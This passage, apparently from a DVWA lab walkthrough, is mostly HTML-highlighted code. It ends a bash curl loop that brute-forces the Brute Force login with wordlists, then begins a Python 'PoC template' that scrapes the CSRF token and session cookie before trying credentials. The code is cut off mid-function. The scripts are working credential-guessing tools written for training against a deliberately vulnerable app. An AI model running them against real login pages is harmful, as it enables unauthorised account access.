&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="nb"&gt;read&lt;/span&gt; -r _USER&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;## Increase counter&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;i+1&lt;span class="o"&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;## Feedback for user&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[i] Try ${i}: ${_USER} // ${_PASS}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;## Connect to server&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="nv"&gt;REQUEST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;$( curl -s -b 'security=low' -b /tmp/dvwa.cookie &amp;quot;&lt;/span&gt;&lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;URL&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;/vulnerabilities/brute/?username&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;_USER&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;_PASS&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;Login&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;Login&lt;span class="s2"&gt;&amp;quot; )&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="nv"&gt;$?&lt;/span&gt; -ne &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;]]&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s1"&gt;'\n[!] Issue connecting! #2'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;## Check response&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;${REQUEST}&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; grep -q &lt;span class="s2"&gt;&amp;quot;${SUCCESS}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;$?&amp;quot;&lt;/span&gt; -eq &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;      &lt;span class="c"&gt;## Success!&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;      &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;quot;\n\n[i] Found!&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;      &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[i] Username: ${_USER}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;      &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[i] Password: ${_PASS}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;      &lt;span class="nb"&gt;break &lt;/span&gt;2
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="k"&gt;done&lt;/span&gt; &amp;lt; &lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;USER_LIST&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;done&lt;/span&gt; &amp;lt; &lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;PASS_LIST&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;## Clean up&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;rm -f /tmp/dvwa.cookie
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;hr /&gt;

&lt;a name="Python.Template"&gt;&lt;/a&gt;
&lt;h3&gt;Python Template&lt;/h3&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;span class="line-number"&gt;28&lt;/span&gt;
&lt;span class="line-number"&gt;29&lt;/span&gt;
&lt;span class="line-number"&gt;30&lt;/span&gt;
&lt;span class="line-number"&gt;31&lt;/span&gt;
&lt;span class="line-number"&gt;32&lt;/span&gt;
&lt;span class="line-number"&gt;33&lt;/span&gt;
&lt;span class="line-number"&gt;34&lt;/span&gt;
&lt;span class="line-number"&gt;35&lt;/span&gt;
&lt;span class="line-number"&gt;36&lt;/span&gt;
&lt;span class="line-number"&gt;37&lt;/span&gt;
&lt;span class="line-number"&gt;38&lt;/span&gt;
&lt;span class="line-number"&gt;39&lt;/span&gt;
&lt;span class="line-number"&gt;40&lt;/span&gt;
&lt;span class="line-number"&gt;41&lt;/span&gt;
&lt;span class="line-number"&gt;42&lt;/span&gt;
&lt;span class="line-number"&gt;43&lt;/span&gt;
&lt;span class="line-number"&gt;44&lt;/span&gt;
&lt;span class="line-number"&gt;45&lt;/span&gt;
&lt;span class="line-number"&gt;46&lt;/span&gt;
&lt;span class="line-number"&gt;47&lt;/span&gt;
&lt;span class="line-number"&gt;48&lt;/span&gt;
&lt;span class="line-number"&gt;49&lt;/span&gt;
&lt;span class="line-number"&gt;50&lt;/span&gt;
&lt;span class="line-number"&gt;51&lt;/span&gt;
&lt;span class="line-number"&gt;52&lt;/span&gt;
&lt;span class="line-number"&gt;53&lt;/span&gt;
&lt;span class="line-number"&gt;54&lt;/span&gt;
&lt;span class="line-number"&gt;55&lt;/span&gt;
&lt;span class="line-number"&gt;56&lt;/span&gt;
&lt;span class="line-number"&gt;57&lt;/span&gt;
&lt;span class="line-number"&gt;58&lt;/span&gt;
&lt;span class="line-number"&gt;59&lt;/span&gt;
&lt;span class="line-number"&gt;60&lt;/span&gt;
&lt;span class="line-number"&gt;61&lt;/span&gt;
&lt;span class="line-number"&gt;62&lt;/span&gt;
&lt;span class="line-number"&gt;63&lt;/span&gt;
&lt;span class="line-number"&gt;64&lt;/span&gt;
&lt;span class="line-number"&gt;65&lt;/span&gt;
&lt;span class="line-number"&gt;66&lt;/span&gt;
&lt;span class="line-number"&gt;67&lt;/span&gt;
&lt;span class="line-number"&gt;68&lt;/span&gt;
&lt;span class="line-number"&gt;69&lt;/span&gt;
&lt;span class="line-number"&gt;70&lt;/span&gt;
&lt;span class="line-number"&gt;71&lt;/span&gt;
&lt;span class="line-number"&gt;72&lt;/span&gt;
&lt;span class="line-number"&gt;73&lt;/span&gt;
&lt;span class="line-number"&gt;74&lt;/span&gt;
&lt;span class="line-number"&gt;75&lt;/span&gt;
&lt;span class="line-number"&gt;76&lt;/span&gt;
&lt;span class="line-number"&gt;77&lt;/span&gt;
&lt;span class="line-number"&gt;78&lt;/span&gt;
&lt;span class="line-number"&gt;79&lt;/span&gt;
&lt;span class="line-number"&gt;80&lt;/span&gt;
&lt;span class="line-number"&gt;81&lt;/span&gt;
&lt;span class="line-number"&gt;82&lt;/span&gt;
&lt;span class="line-number"&gt;83&lt;/span&gt;
&lt;span class="line-number"&gt;84&lt;/span&gt;
&lt;span class="line-number"&gt;85&lt;/span&gt;
&lt;span class="line-number"&gt;86&lt;/span&gt;
&lt;span class="line-number"&gt;87&lt;/span&gt;
&lt;span class="line-number"&gt;88&lt;/span&gt;
&lt;span class="line-number"&gt;89&lt;/span&gt;
&lt;span class="line-number"&gt;90&lt;/span&gt;
&lt;span class="line-number"&gt;91&lt;/span&gt;
&lt;span class="line-number"&gt;92&lt;/span&gt;
&lt;span class="line-number"&gt;93&lt;/span&gt;
&lt;span class="line-number"&gt;94&lt;/span&gt;
&lt;span class="line-number"&gt;95&lt;/span&gt;
&lt;span class="line-number"&gt;96&lt;/span&gt;
&lt;span class="line-number"&gt;97&lt;/span&gt;
&lt;span class="line-number"&gt;98&lt;/span&gt;
&lt;span class="line-number"&gt;99&lt;/span&gt;
&lt;span class="line-number"&gt;100&lt;/span&gt;
&lt;span class="line-number"&gt;101&lt;/span&gt;
&lt;span class="line-number"&gt;102&lt;/span&gt;
&lt;span class="line-number"&gt;103&lt;/span&gt;
&lt;span class="line-number"&gt;104&lt;/span&gt;
&lt;span class="line-number"&gt;105&lt;/span&gt;
&lt;span class="line-number"&gt;106&lt;/span&gt;
&lt;span class="line-number"&gt;107&lt;/span&gt;
&lt;span class="line-number"&gt;108&lt;/span&gt;
&lt;span class="line-number"&gt;109&lt;/span&gt;
&lt;span class="line-number"&gt;110&lt;/span&gt;
&lt;span class="line-number"&gt;111&lt;/span&gt;
&lt;span class="line-number"&gt;112&lt;/span&gt;
&lt;span class="line-number"&gt;113&lt;/span&gt;
&lt;span class="line-number"&gt;114&lt;/span&gt;
&lt;span class="line-number"&gt;115&lt;/span&gt;
&lt;span class="line-number"&gt;116&lt;/span&gt;
&lt;span class="line-number"&gt;117&lt;/span&gt;
&lt;span class="line-number"&gt;118&lt;/span&gt;
&lt;span class="line-number"&gt;119&lt;/span&gt;
&lt;span class="line-number"&gt;120&lt;/span&gt;
&lt;span class="line-number"&gt;121&lt;/span&gt;
&lt;span class="line-number"&gt;122&lt;/span&gt;
&lt;span class="line-number"&gt;123&lt;/span&gt;
&lt;span class="line-number"&gt;124&lt;/span&gt;
&lt;span class="line-number"&gt;125&lt;/span&gt;
&lt;span class="line-number"&gt;126&lt;/span&gt;
&lt;span class="line-number"&gt;127&lt;/span&gt;
&lt;span class="line-number"&gt;128&lt;/span&gt;
&lt;span class="line-number"&gt;129&lt;/span&gt;
&lt;span class="line-number"&gt;130&lt;/span&gt;
&lt;span class="line-number"&gt;131&lt;/span&gt;
&lt;span class="line-number"&gt;132&lt;/span&gt;
&lt;span class="line-number"&gt;133&lt;/span&gt;
&lt;span class="line-number"&gt;134&lt;/span&gt;
&lt;span class="line-number"&gt;135&lt;/span&gt;
&lt;span class="line-number"&gt;136&lt;/span&gt;
&lt;span class="line-number"&gt;137&lt;/span&gt;
&lt;span class="line-number"&gt;138&lt;/span&gt;
&lt;span class="line-number"&gt;139&lt;/span&gt;
&lt;span class="line-number"&gt;140&lt;/span&gt;
&lt;span class="line-number"&gt;141&lt;/span&gt;
&lt;span class="line-number"&gt;142&lt;/span&gt;
&lt;span class="line-number"&gt;143&lt;/span&gt;
&lt;span class="line-number"&gt;144&lt;/span&gt;
&lt;span class="line-number"&gt;145&lt;/span&gt;
&lt;span class="line-number"&gt;146&lt;/span&gt;
&lt;span class="line-number"&gt;147&lt;/span&gt;
&lt;span class="line-number"&gt;148&lt;/span&gt;
&lt;span class="line-number"&gt;149&lt;/span&gt;
&lt;span class="line-number"&gt;150&lt;/span&gt;
&lt;span class="line-number"&gt;151&lt;/span&gt;
&lt;span class="line-number"&gt;152&lt;/span&gt;
&lt;span class="line-number"&gt;153&lt;/span&gt;
&lt;span class="line-number"&gt;154&lt;/span&gt;
&lt;span class="line-number"&gt;155&lt;/span&gt;
&lt;span class="line-number"&gt;156&lt;/span&gt;
&lt;span class="line-number"&gt;157&lt;/span&gt;
&lt;span class="line-number"&gt;158&lt;/span&gt;
&lt;span class="line-number"&gt;159&lt;/span&gt;
&lt;span class="line-number"&gt;160&lt;/span&gt;
&lt;span class="line-number"&gt;161&lt;/span&gt;
&lt;span class="line-number"&gt;162&lt;/span&gt;
&lt;span class="line-number"&gt;163&lt;/span&gt;
&lt;span class="line-number"&gt;164&lt;/span&gt;
&lt;span class="line-number"&gt;165&lt;/span&gt;
&lt;span class="line-number"&gt;166&lt;/span&gt;
&lt;span class="line-number"&gt;167&lt;/span&gt;
&lt;span class="line-number"&gt;168&lt;/span&gt;
&lt;span class="line-number"&gt;169&lt;/span&gt;
&lt;span class="line-number"&gt;170&lt;/span&gt;
&lt;span class="line-number"&gt;171&lt;/span&gt;
&lt;span class="line-number"&gt;172&lt;/span&gt;
&lt;span class="line-number"&gt;173&lt;/span&gt;
&lt;span class="line-number"&gt;174&lt;/span&gt;
&lt;span class="line-number"&gt;175&lt;/span&gt;
&lt;span class="line-number"&gt;176&lt;/span&gt;
&lt;span class="line-number"&gt;177&lt;/span&gt;
&lt;span class="line-number"&gt;178&lt;/span&gt;
&lt;span class="line-number"&gt;179&lt;/span&gt;
&lt;span class="line-number"&gt;180&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="python"&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#!/usr/bin/python&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Quick PoC template for brute force HTTP GET form&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Target: DVWA v1.10 (Brute Force - Low)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#   Date: 2015-10-25&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Author: g0tmi1k ~ https://blog.g0tmi1k.com/&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Source: https://blog.g0tmi1k.com/dvwa/bruteforce-low/&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;re&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;BeautifulSoup&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Variables&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;target&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'http://192.168.1.44/DVWA'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;sec_level&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'low'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;dvwa_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'admin'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;dvwa_pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'password'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;user_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'/usr/share/seclists/Usernames/top_shortlist.txt'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;pass_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'/usr/share/seclists/Passwords/rockyou.txt'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Value to look for in response header (Whitelisting)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;success&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'Welcome to the password protected area'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Get the anti-CSRF token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;csrf_token&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;# Make the request to the URL&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[i] URL: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;/login.php&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;target&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{0}/login.php&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;allow_redirects&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;# Feedback for the user (there was an error) &amp;amp; Stop execution of our request&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[!] csrf_token: Failed to connect (URL: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;/login.php).&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[i] Quitting.&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Extract anti-CSRF token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;soup&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;user_token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;soup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;input&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;user_token&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;})[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;value&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[i] user_token: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;user_token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Extract session information&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;session_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;PHPSESSID=(.*?);&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;set-cookie&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;session_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;group&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[i] session_id: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user_token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Login to DVWA core&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;dvwa_login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user_token&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# POST data&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;dvwa_user&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;dvwa_pass&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;user_token&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;user_token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;Login&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Login&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Cookie data&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;cookie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;PHPSESSID&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;security&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;sec_level&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="p"&gt;}&lt;/span&gt;
